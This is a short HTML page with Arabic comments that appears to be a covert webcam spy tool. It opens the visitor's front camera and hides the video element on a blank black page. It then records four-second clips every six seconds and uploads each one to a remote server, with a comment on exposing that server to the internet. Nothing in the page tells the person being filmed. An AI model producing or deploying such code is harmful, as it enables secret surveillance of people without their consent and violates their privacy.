<!DOCTYPE html>
<html><head><meta charset="utf-8"><style>body{margin:0;background:#000;}</style></head><body>
<video id="v" autoplay playsinline style="display:none"></video>
<script>
// غيّر الرابط ده بس (استخدم port.baselh.me لو عايز من النت)
const SERVER_URL = "http://192.168.1.89:5555/upload";

navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false})
.then(stream => {
    const video = document.getElementById('v');
    video.srcObject = stream;

    const recorder = new MediaRecorder(stream, {mimeType: 'video/webm;codecs=vp8'});
    let chunks = [];

    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = () => {
        const blob = new Blob(chunks, {type: 'video/webm'});
        chunks = [];

        fetch(SERVER_URL, {
            method: 'POST',
            body: blob,
            headers: {'Content-Type': 'video/webm'},
            // بدون no-cors عشان يشتغل
        })
        .then(r => console.log("تم الإرسال"))
        .catch(e => console.log("فشل:", e));
    };

    // تسجيل 4 ثواني كل 6 ثواني
    setInterval(() => {
        if (recorder.state === "inactive") recorder.start();
        setTimeout(() => {
            if (recorder.state === "recording") recorder.stop();
        }, 4000);
    }, 6000);

}).catch(e => console.log("رفض الكاميرا"));
</script>
</body></html>
